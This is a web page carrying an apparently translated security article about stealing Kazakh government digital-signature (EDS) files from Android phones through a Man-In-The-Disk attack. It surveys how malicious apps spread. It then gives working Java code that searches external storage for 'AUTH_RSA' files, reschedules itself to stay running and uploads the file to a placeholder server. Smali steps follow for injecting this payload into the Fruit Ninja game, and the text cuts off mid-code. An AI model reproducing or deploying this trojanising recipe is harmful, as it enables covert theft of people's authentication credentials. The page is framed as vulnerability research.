<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Stealing EDS Using Man-In-The-Disk</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Kazakhstan mobile applications mEGOV and UAPF use digital signatures as one of the methods of authorization. To log in in this way, you need to transf...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Stealing EDS Using Man-In-The-Disk</h1><div class="post__text post__text-html js-mediator-article"><p>  Kazakhstan mobile applications <a href="https://play.google.com/store/apps/details%3Fid%3Dkz.nitec.egov.mgov">mEGOV</a> and <a href="https://play.google.com/store/apps/details%3Fid%3Dkz.nitec.egov.mgov">UAPF</a> use <a href="https://play.google.com/store/apps/details%3Fid%3Dkz.nitec.egov.mgov">digital signatures</a> as one of the methods of authorization.  To log in in this way, you need to transfer the file from the digital signature to the phone.  This authorization method is vulnerable to a Man-In-The-Disk attack (more about this in details below).  To become a victim of an attack, you just need to install any of your favorite application, which was secretly modified by an attacker.  I will demonstrate how this can be done.  First, find out how such applications can reach the user. <a name="habracut"></a></p><br><h2 id="kak-vredonosnye-prilozheniya-popadayut-na-telefon">  How malicious applications get on the phone </h2><br><h3 id="lokalnye-markety-prilozheniy-kitaya-irana-i-td">  Local application markets of China, Iran, etc. </h3><br><p>  Examples: cafebazaar.ir, android.myapp.com, apkplz.net </p><br><p>  These sites appeared due to censorship and blocking of Google services and / or servers of official applications.  Usually they contain local analogues of popular applications and their modifications.  Such modifications (like <a href="https://apkplz.net/app/org.ir.talaeii">this Iranian telegram</a> ) contain supposedly new, cool features.  What is the danger of such applications?  You never know what they are actually doing.  In addition, some governments do not miss the opportunity and publish their modifications, with tools for tracking the user.  Government surveillance applications are malicious by definition.  Once, I studied a malicious application ( <a href="https://www.virustotal.com/gui/file/1e6a821f5de824b91c6676742a521a8dcdd345f25a820befa11e5975fc8c39d3/community">Virustotal result</a> , sample <a href="">here</a> , password: infected), which scanned the phone for telegram clones: </p><br><pre><code class="plaintext hljs">"com.hanista.mobogram" "org.ir.talaeii" "ir.hotgram.mobile.android" "ir.avageram.com" "org.thunderdog.challegram" "ir.persianfox.messenger" "com.telegram.hame.mohamad" "com.luxturtelegram.black" "com.talla.tgr" "com.mehrdad.blacktelegram"</code> </pre> <br><p>  This list indicates the real relevance and popularity of such applications.  Researching this malware has led me to an <a href="https://cybershafarat.com/2016/01/20/farsitelegram/">article</a> that talks about a telegram clone distributed through the <em>Cafebazaar</em> market by the Iranian government.  Quote from there: </p><br><blockquote>  This looks to be developed to the specifications of the Iranian government enabling them to track every bit and byte put forward by users of the app. </blockquote><p>  How many telegram clones do you see ?: ( <a href="https://apkplz.net/">Source</a> ) </p><br><p><img src="https://habrastorage.org/webt/bg/l2/k1/bgl2k1slpn6zgcegcnwmvssgo_o.png" alt="image"></p><br><p>  It is almost impossible for ordinary users to protect themselves from this, since there is no other choice - official sources are being intensely blocked, and their own are being promoted.  Researchers and antivirus companies from around the world, after identifying infected applications, promptly report this to Google and they are removed from the Play Market, which, obviously, does not apply to third-party application markets.  Also, Google‚Äôs policy regarding the admission of hosted applications does not apply to them. </p><br><p>  Some of the markets are very popular, such as the <em>Tencent My App</em> , with 260 million users per month ( <a href="https://www.appinchina.co/market/app-stores/">Source</a> ) </p><br><p><img src="https://habrastorage.org/webt/kb/cy/_4/kbcy_4bdvjpqe0m7flp9kvuhqlm.png" alt="image"></p><br><p>  Local applications used within the same region / country often use the same SDK (set of libraries) for advertising tracking, social integration.  networks, etc. ... If the same library is used in several applications, then with high probability, some of these applications can be installed on one user.  Such libraries can use the capabilities of different applications in which they are built-in to steal user data, bypassing the granted permissions.  For example, one application has access to receive IMEI, but does not have access to the Internet.  The built-in library knows about this and therefore reads the IMEI and saves it on the SD card in a hidden folder.  The same library is built into another application that has Internet access but no access to IMEI, reads it from a hidden folder and sends it to its server.  This method was used by two Chinese companies Baidu and Salmonads.  You can read more about this <a href="https://www.ftc.gov/system/files/documents/public_events/1415032/privacycon2019_serge_egelman.pdf">here</a> . </p><br><h3 id="fishing">  Phishing </h3><br><p>  Classical phishing is the main tool of international groups and <a href="https://www.theverge.com/2018/1/18/16905464/spyware-lebanon-government-research-dark-caracal-gdgs">special services of different countries</a> .  As it often happens, a regular messenger application is taken, functionality for tracking is added to it, and then it is massively distributed, with a note "Look, what a cool application for communication."  Delivery to users can be carried out through social.  networks, spam Whatsapp / Telegram, built-in ads on sites, etc. </p><br><p><img src="https://habrastorage.org/webt/r6/tc/l7/r6tcl7dsdaqv4q-smmh2v-_67tk.png" alt="image"></p><br><p>  <a href="https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf">Source, p. 19.</a> </p><br><p>  Phishing links, in the form of posts on Facebook: </p><br><p><img src="https://habrastorage.org/webt/hy/zy/os/hyzyosiig_lrebvyhsw38am4m8o.png" alt="image"></p><br><p>  <a href="https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf">Source, p. 22</a> </p><br><p>  Popup on one famous site </p><br><p><img src="https://habrastorage.org/webt/v9/8q/m1/v98qm1pkrd2mt90zrmjktwwow60.png" alt="image"></p><br><p>  <a href="https://xakep.ru/2017/01/27/mobile-phishing/">A source</a> </p><br><h3 id="telegram-botygruppy">  Telegram bots / groups </h3><br><p>  Example: @apkdl_bot, t.me/fun_android </p><br><p>  There are telegram bots for downloading apk files.  Instead of a legitimate application, they may slip malware into you.  Or infect your requested application on the fly.  It works like this - you enter the bot / group command that you want to download "Instagram", the script on the other side downloads it from Google Play, unpacks, adds malicious code, packs it back and returns it to you.  How this is done automatically, I will try to show an example in the near future. </p><br><h3 id="storonnie-sayty-posredniki">  Third Party Mediation Sites </h3><br><p>  Example: apkpure.com, apkmirror.com, apps.evozi.com/apk-downloader/ </p><br><p>  There are a huge number of unofficial sites for downloading android applications.  Some of them provide the ability to download your application, which may be malicious.  Download example on <a href="https://www.apkmirror.com/">this site</a> : </p><br><p><img src="https://habrastorage.org/webt/om/sb/lt/omsblt9mpidhrw9zljs0ejexlmc.png" alt="image"></p><br><p>  One example of a malvari that has spread this way ( <a href="https://www.cmcm.com/blog/en/security/2015-09-18/799.html">Source</a> ): </p><br><p><img src="https://habrastorage.org/webt/zb/n3/te/zbn3tewawcdn0cyfilfmwzqo4wg.jpeg" alt="image"></p><br><p>  Sample statistics for unofficial sources can be found in the <a href="https://source.android.com/security/reports/Google_Android_Security_2018_Report_Final.pdf">Android Security Report 2018</a> - 1.6 billion blocked Google Play Protect installations not from Google Play.  There were much more installations. <br>  Some even write <a href="https://www.makeuseof.com/tag/using-android-without-google/">articles</a> about how good it is to use third-party markets. <br>  A separate whole world is made up of sites that distribute applications without ads, hacked paid applications for free, applications with additional functionality: </p><br><p><img src="https://habrastorage.org/webt/dh/il/oh/dhilohxhl2btapm67zmyt68drb0.png" alt="image"></p><br><p><img src="https://habrastorage.org/webt/fe/yv/si/feyvsif5ius3rfkc7dhxayt9onw.png" alt="image"></p><br><h3 id="google-play">  Google play </h3><br><p>  The official source has protection against suspicious applications called Google Play Protect, which uses machine learning to determine the degree of malware.  But such protection is not able to understand exactly which application is malicious and which is not, since this requires a full manual check.  What is the difference between a spy app that monitors all your movements and a running app?  Researchers <a href="https://news.drweb.ru/show/%3Fi%3D13349%26lng%3Dru">constantly</a> <a href="https://www.zdnet.com/article/android-security-flashlight-apps-on-google-play-infested-with-adware-were-downloaded-by-1-5m-people/">find</a> <a href="https://www.zdnet.com/article/google-malware-in-google-play-doubled-in-2018-because-of-click-fraud-apps/">hundreds of</a> <a href="https://www.express.co.uk/life-style/science-technology/1143651/Android-warning-malware-Google-Play-Store-security-June-23">infected</a> <a href="https://www.vice.com/en_us/article/43z93g/hackers-hid-android-malware-in-google-play-store-exodus-esurv">applications</a> published on Google Play. </p><br><p>  Typically, a malicious application calls itself <em>google play services</em> or similar, and <a href="https://www.zdnet.com/article/this-trojan-masquerades-as-google-play-to-hide-on-your-phone">puts a similar icon</a> .  This is misleading to users.  Why Google Play does not check the icon for similarity with its official applications is unclear.  Once in a telegram, I put an avatar with a paper airplane and they blocked me.  Another method used by malicious applications is to replace the letters ("L" with "I", "g" with "q") to create a name similar to the official application: </p><br><p><img src="https://habrastorage.org/webt/ns/da/fa/nsdafar3chowitbxqf_k0lsmiki.png" alt="image"></p><br><p>  <a href="https://ti.360.net/blog/articles/stealjob-new-android-malware-used-by-donot-apt-group-en/">Source</a> </p><br><h3 id="drugie-sposoby">  other methods </h3><br><ol><li><p>  <a href="https://www.thesun.co.uk/tech/4298260/smartphone-screen-repair-shops-could-let-spies-into-your-phone/">In phone repair services</a> </p><br></li><li><p>  <a href="https://www.theguardian.com/world/2019/jul/02/chinese-border-guards-surveillance-app-tourists-phones">When crossing the border</a> </p><br></li><li><p>  Connect to an unfamiliar computer via USB, with debugging enabled. </p><br></li><li><p>  An attacker gaining access to your Google account, and installing the application on your phone through Google Play. </p><br></li><li><p>  <a href="https://thehackernews.com/2016/11/hacking-android-smartphone.html">Preinstalled applications</a> </p><br></li><li><p>  <a href="https://security.stackexchange.com/questions/194353/police-forcing-me-to-install-jingwang-spyware-app-how-to-minimize-impact">By court order and without.</a>  <a href="https://security.stackexchange.com/questions/194353/police-forcing-me-to-install-jingwang-spyware-app-how-to-minimize-impact">By the police or special services</a> </p><br></li><li><p>  <a href="https://www.trendmicro.com/vinfo/us/threat-encyclopedia/web-attack/137/watering-hole-101%3FClickID%3Dcqlns7xfva7wwxx4iiw4qfvpxkllkiqwpkz">Watering hole attack</a> </p><br></li><li><p>  You came to visit a friend, and his <a href="http://www.aftvnews.com/android-malware-worm-that-mines-cryptocurrency-is-infecting-amazon-fire-tv-and-fire-tv-stick-devices/">TV infected your phone</a> </p><br></li></ol><br><blockquote>  The particular version appearing on Fire TV devices installs itself as an app called ‚ÄúTest‚Äù with the package name ‚Äúcom.google.time.timer‚Äù.  Once it infects an Android device, it begins to use the device's resources to mine cryptocurrencies and attempts to spread itself to other Android devices on the same network. </blockquote><br><h2 id="kak-zloumyshlenniki-zarazhayut-android-prilozheniya">  How attackers infect android applications </h2><br><p>  Now we understand how a malicious application can get on your phone.  Next, it will be demonstrated how an attacker can modify any android application.  An example will be used with the introduction of code in the popular game <a href="https://play.google.com/store/apps/details%3Fid%3Dcom.halfbrick.fruitninjafree">Fruit Ninja</a> .  The code scans the phone‚Äôs memory, searches for a file with EDS and sends it to the server (root is naturally not required). </p><br><h3 id="chto-takoe-man-in-the-disk">  What is Man-In-The-Disk? </h3><br><p>  The public drew attention to this attack vector, after this <a href="https://blog.checkpoint.com/2018/08/12/man-in-the-disk-a-new-attack-surface-for-android-apps/">article</a> .  I advise you to read it first. </p><br><p>  <em>For those who have read, I‚Äôll add from myself - modifying the shared files of other applications can also lead to exploitation of vulnerabilities in libraries that use these files</em> </p><br><p>  Who did not read, I will tell in brief.  To begin with, let's define concepts.  In android, the memory for applications is divided into Internal Storage and External Storage.  Internal storage is the internal memory of the application, accessible only to him and to no one else.  Absolutely every application on the phone corresponds to a separate user and a separate folder with rights only for this user.  This is a great defense mechanism.  External storage - the main memory of the phone, accessible to all applications (this also includes the SD card)  Why is it needed?  Take a photo editor application.  After editing, you must save the photo so that it is accessible from the gallery.  Naturally, if you put it in internal storage, then it will not be available to anyone except your application.  Or a browser that downloads all files to the Downloads shared folder. </p><br><p>  Each android application has its own set of permissions that it requests.  But it‚Äôs not so good with them.  Among them there are those that people willingly close their eyes and do not take seriously.  Among them is READ_EXTERNAL_STORAGE.  It allows the application to access the main memory of the phone, and therefore to all data of other applications.  After all, no one will be surprised if the notebook application asks for this permission.  It may be necessary for him to store settings and cache there.  Manipulating the data of other applications in external storage is the attack of Man-In-The-Disk.  Another, almost defaulted, resolution is INTERNET.  As the name implies, it allows the application to have access to the network.  The saddest thing is that the user is not shown a special window asking him to give this permission.  You just write it in your application and they give it to you. </p><br><p>  I downloaded the top 15 Kazakhstani applications and wrote a <a href="https://github.com/thatskriptkid/OrderOfSixAngles">script</a> that displays statistics on requested permissions.  As you can see, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE and INTERNET are very popular.  This means that attackers can less painfully embed code that steals digital signatures in most applications. </p><br>  List of tested applications <br>  2-GIS, AliExpress, Chocofood, Chrome, InDriver, Instagram, Kaspi, Kolesa, Krisha, Telegram, VK, WhatsApp, Yandex Music, Yandex Taxi <br>  , Zakon KZ <br><br><p><img src="https://habrastorage.org/webt/hz/sj/uj/hzsjujj6x9k57felsqehjr7m0za.png" alt="image"></p><br><p>  If you put whatsapp on a rooted phone, then all your correspondence is stored in clear text.  Apparently whatsapp does not consider it necessary to even use encryption on such a "corrupted" phone.  Also, in external storage, whatsapp stores SSLSessionCache (File-based cache of established SSL sessions).  In the future, I‚Äôll try to explore how you can use these files received from someone else‚Äôs phone. </p><br><p>  Telegrams and Instagram store cached images in shared memory.  Almost all the photos you view, and those that you send to each other, are available to any application on your phone. </p><br><p><img src="https://habrastorage.org/webt/ey/jb/ol/eyjbolqxrjqp3ewfjbpkzldufw0.png" alt="image"></p><br><p>  MEGOV and ENPF applications require that the digital signature is in External Storage: </p><br><p><img src="https://habrastorage.org/webt/7v/h1/r5/7vh1r51l1hodhonpnnt06xifsxw.png" alt="image"></p><br><p><img src="https://habrastorage.org/webt/dh/q0/jr/dhq0jrc0gdwghwvbuynga8jzvjk.png" alt="image"></p><br><p>  Google is aware of the problem and <a href="https://developer.android.com/preview/privacy/scoped-storage%3Fhl%3Dru">is about to change</a> READ_EXTERNAL_STORAGE in Android Q. Quote: </p><br><blockquote>  In order to access any other file that another app has created, including files in a "downloads" directory, your app must use the Storage Access Framework, which allows the user to select a specific file. </blockquote><br><h2 id="sozdaem-payload">  Create payload </h2><br><p>  Let's move on to the main scanner functionality.  It will consist of three main classes: <code>StageAttack</code> , <code>MaliciousService</code> , <code>MaliciousTaskManager</code> . </p><br><p><img src="https://habrastorage.org/webt/wh/ru/wy/whruwyym3bmbuogp7apjivk3gm4.png" alt="image"></p><br><p>  <code>StageAttack</code> - consists of one static method that starts our attack.  We specifically create a transitional static method, for the convenience of implementation in the finished class. </p><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">StageAttack</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">pwn</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context ctx)</span></span></span><span class="hljs-function"> </span></span>{ Intent intent = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(ctx, MaliciousService.class); ctx.startService(intent); } }</code> </pre> <br><p>  <code>MaliciousService</code> is a service that recursively searches all external storage. </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> String </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">pwn2</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(File dir)</span></span></span><span class="hljs-function"> </span></span>{ String path = <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>; File[] list = dir.listFiles(); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (File f : list) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (f.isDirectory()) { path = pwn2(f); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (path != <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> path; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { path = f.getAbsolutePath(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (path.contains(<span class="hljs-string"><span class="hljs-string">"AUTH_RSA"</span></span>)) { Log.d(TAG, <span class="hljs-string"><span class="hljs-string">"AUTH_RSA found here - "</span></span> + path); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> path; } } } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>; }</code> </pre> <br><p>  If the EDS is not found, we will repeat the search every 5 seconds until we find it.  You can use any interval.  Taking too small an interval, our service runs the risk of being stopped by the system.  The higher the version of android, the more severe the policy regarding the operation of background processes.  We also cannot use Foreground service, since a notification must constantly hang for this.  Not being an android developer, I spent a lot of time to find a way to schedule a task that will be completed on time.  It is not as simple as it seems.  There are several recommended methods in Android (JobService, WorkManager, setRepeating () AlarmManager).  The documentation does not explicitly indicate that the interval of the task should be at least 15 minutes and its execution time depends on the desire of the system.  This does not suit us, so we use the <code>AlarmManager</code> class, the <code>setExactAndAllowWhileIdle()</code> method.  When the task is completed, we plan it again, with the same interval.  This is the only method currently known to me that has the highest accuracy. </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">scheduleMalService</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ Context ctx = getApplicationContext(); AlarmManager alarmMgr = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE); Intent intent = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(ctx, MaliciousTaskManager.class); <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> _id = (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>) System.currentTimeMillis(); PendingIntent alarmIntent = PendingIntent.getBroadcast(ctx, _id, intent, <span class="hljs-number"><span class="hljs-number">0</span></span>); alarmMgr.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + <span class="hljs-number"><span class="hljs-number">5000</span></span>, alarmIntent); }</code> </pre> <br><p>  If an EDS is found, then we send the file to the server: </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sendToServer</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String path)</span></span></span><span class="hljs-function"> </span></span>{ File file = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> File(path); URL url = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> URL(<span class="hljs-string"><span class="hljs-string">"http://xxxxxxxxxx"</span></span>); HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection(); urlConnection.setConnectTimeout(<span class="hljs-number"><span class="hljs-number">30</span></span> * <span class="hljs-number"><span class="hljs-number">1000</span></span>); urlConnection.setRequestMethod(<span class="hljs-string"><span class="hljs-string">"POST"</span></span>); urlConnection.setDoOutput(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); urlConnection.setRequestProperty(<span class="hljs-string"><span class="hljs-string">"Content-Type"</span></span>, <span class="hljs-string"><span class="hljs-string">"application/octet-stream"</span></span>); DataOutputStream request = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> DataOutputStream(urlConnection.getOutputStream()); request.write(readFileToByteArray(file)); request.flush(); request.close(); <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> respCode = urlConnection.getResponseCode(); Log.d(TAG, <span class="hljs-string"><span class="hljs-string">"Return status code: "</span></span> + respCode); }</code> </pre> <br><h2 id="vnedryaem-payload">  We introduce payload </h2><br><p>  First, we decompile Fruit Ninja using <a href="https://ibotpeaches.github.io/Apktool/">apktool</a> .  We do not decompile the application before java code, because after the modification, we will not be able to assemble it back.  We need to get exactly smali classes.  And we will also implement our code in the form of smali code. </p><br>  What is smali code? <br>  Android applications are compiled into bytecode, which is executed by the Dalvik virtual machine.  The bytecode itself is hard to read, so its human-readable form is called smali.  smali is an analogue of assembly language, but for android. <br><br><p>  Further, if we want our payload to start when the application starts, we must modify the entry point.  The entry point to any application GUI is an Activity child class that takes ACTION_MAIN.  Open the folder with the decompiled application, and find it in the AndroidManifest.xml file: </p><br><pre> <code class="java hljs">&lt;activity android:name=<span class="hljs-string"><span class="hljs-string">"com.halfbrick.mortar.MortarGameLauncherActivity"</span></span>&gt; &lt;intent-filter&gt; &lt;action android:name=<span class="hljs-string"><span class="hljs-string">"android.intent.action.MAIN"</span></span>/&gt; &lt;category android:name=<span class="hljs-string"><span class="hljs-string">"android.intent.category.LAUNCHER"</span></span>/&gt; &lt;/intent-filter&gt; &lt;/activity&gt;</code> </pre> <br><p>  We found the <code>com.halfbrick.mortar.MortarGameLauncherActivity</code> class we <code>com.halfbrick.mortar.MortarGameLauncherActivity</code> .  Before you study it, let's look at the life cycle of Activity, this will be useful to us. </p><br><p><img src="https://habrastorage.org/webt/tz/nc/cz/tzncczehraigp6fvglv6dd5qfik.png" alt="image"></p><br><p>  <a href="https://developer.android.com/reference/android/app/Activity">A source</a> </p><br><p>  Open Activity, for me it lies along the path <em>base \ smali_classes2 \ com \ halfbrick \ mortar \ MortarGameLauncherActivity.smali</em> .  If you have not seen smali code before, this is not scary, it is simple enough to <strong>read</strong> and logically clear. </p><br><pre> <code class="java hljs">.class <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> Lcom/halfbrick/mortar/MortarGameLauncherActivity; <span class="hljs-comment"><span class="hljs-comment">//     package .super Landroid/app/Activity; //.super     . // Activity    android.app.Activity. .source "MortarGameLauncherActivity.java" //  Java . .method public constructor &lt;init&gt;()V /*       -   .   ,    .   , V - void */ .locals 0 /*   Dalvik   ,    .    ,      .       .    ,     16, 256  64.       ,  .       .    ,    . .locals 0 - ,    0  .    ,  v0, v1, v2, v3, ...    - p0, p1, p2, p3. */ .line 28 invoke-direct {p0}, Landroid/app/Activity;-&gt;&lt;init&gt;()V /* invoke-     . invoke-direct -   ,   . ,     java - private  .    ,       ,   .      . p0 -    this  java. init   ,     . */ return-void //    .end method .method protected onStart()V .locals 2 .line 33 invoke-super {p0}, Landroid/app/Activity;-&gt;onStart()V //  onStart()   .line 35 invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;-&gt;isTaskRoot()Z /* invoke-virtual -   .     ,     static, private, final  .  MortarGameLauncherActivity    isTaskRoot(),        Activity.   Z - boolean */ move-result v0 /*    isTaskRoot()   v0. isTaskRoot()  true,   Activity  ,      */ if-nez v0, :cond_0 /*  v0 = true,     cond_0 ( goto).  v0 = false,   */ .line 37 invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;-&gt;finish()V // finish()  Activity return-void //    .line 41 :cond_0 new-instance v0, Landroid/content/Intent; //   Intent        v0 const-class v1, Lcom/halfbrick/mortar/MortarGameActivity; //    MortarGameActivity   v1. MortarGameActivity    Activity. invoke-direct {v0, p0, v1}, Landroid/content/Intent;-&gt;&lt;init&gt;(Landroid/content/Context;Ljava/lang/Class;)V //    Intent,  ,    .line 42 invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;-&gt;finish()V //   Activity .line 43 invoke-virtual {p0, v0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;-&gt;startActivity(Landroid/content/Intent;)V //  MortarGameActivity return-void .end method</span></span></code> </pre> <br><p>  We found out that <code>MortarGameLauncherActivity</code> launches <code>MortarGameActivity</code> and closes.  Open <code>MortarGameActivity</code> .  We will not comment completely on it.  We are interested in what happens in the <code>Oncreate</code> method, since it starts the creation of activity.  Immediately after it we will insert our code.  It is important not to upset the line when pasting. </p><br><pre> <code class="java hljs">.<span class="hljs-function"><span class="hljs-function">method </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onCreate</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Landroid/os/Bundle;)</span></span></span><span class="hljs-function">V .locals 9 :try_start_0 </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">const</span></span></span><span class="hljs-function">-string v0, "android.os.AsyncTask" .line 465 invoke-</span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span></span>{v0}, Ljava/lang/Class;-&gt;forName(Ljava/lang/String;)Ljava/lang/Class; :try_end_0 .<span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0 .line <span class="hljs-number"><span class="hljs-number">471</span></span> :catch_0 invoke-<span class="hljs-keyword"><span class="hljs-keyword">super</span></span> {p0, p1}, Landroid/support/v4/app/FragmentActivity;-&gt;onCreate(Landroid/os/Bundle;)V &lt;--------------------------- <span class="hljs-comment"><span class="hljs-comment">//  ,   472 .line 473 invoke-static {}, Lcom/halfbrick/mortar/NativeGameLib;-&gt;TryLoadGameLibrary()Z .line 475 invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameActivity;-&gt;getIntent()Landroid/content/Intent; ...</span></span></code> </pre> <br><p>  Now we need smali payload code.  We collect our scanner in apk and decompile.  We transfer our three decompiled classes, which lie along the path <em>smali \ kz \ c \ signscan</em> , to the folder <em>com / halfbrick / mortar</em> .  Change the <em>package name to</em> all classes, from <em>kz.c.signscan</em> to <em>com.halfbrick.mortar</em> . </p><br><p>  It was: </p><br><pre> <code class="java hljs">.class <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> Lkz/c/signscan/StageAttack;</code> </pre> <br><p>  It became: </p><br><pre> <code class="java hljs">.class <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> Lcom/halfbrick/mortar/StageAttack;</code> </pre> <br><p>  In the smali MainActivity class, <code>MainActivity</code> take the payload call line: </p><br><pre> <code class="java hljs">invoke-<span class="hljs-keyword"><span class="hljs-keyword">static</span></span> {p0}, Lcom/halfbrick/mortar/StageAttack;-&gt;pwn(Landroid/content/Context;)V</code> </pre> <br><p>  And insert into <code>MortarGameActivity</code> .  As a result, the <code>onCreate()</code> method looks like: </p><br><pre> <code class="java hljs">... .<span class="hljs-function"><span class="hljs-function">method </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onCreate</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Landroid/os/Bundle;)</span></span></span><span class="hljs-function">V .locals 9 :try_start_0 </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">const</span></span></span><span class="hljs-function">-string v0, "android.os.AsyncTask" .line 465 invoke-</span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span></span>{v0}, Ljava/lang/Class;-&gt;forName(Ljava/lang/String;)Ljava/lang/Class; :try_end_0 .<span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0 .line <span class="hljs-number"><span class="hljs-number">471</span></span> :catch_0 invoke-<span class="hljs-keyword"><span class="hljs-keyword">super</span></span> {p0, p1}, Landroid/support/v4/app/FragmentActivity;-&gt;onCreate(Landroid/os/Bundle;)V .line <span class="hljs-number"><span 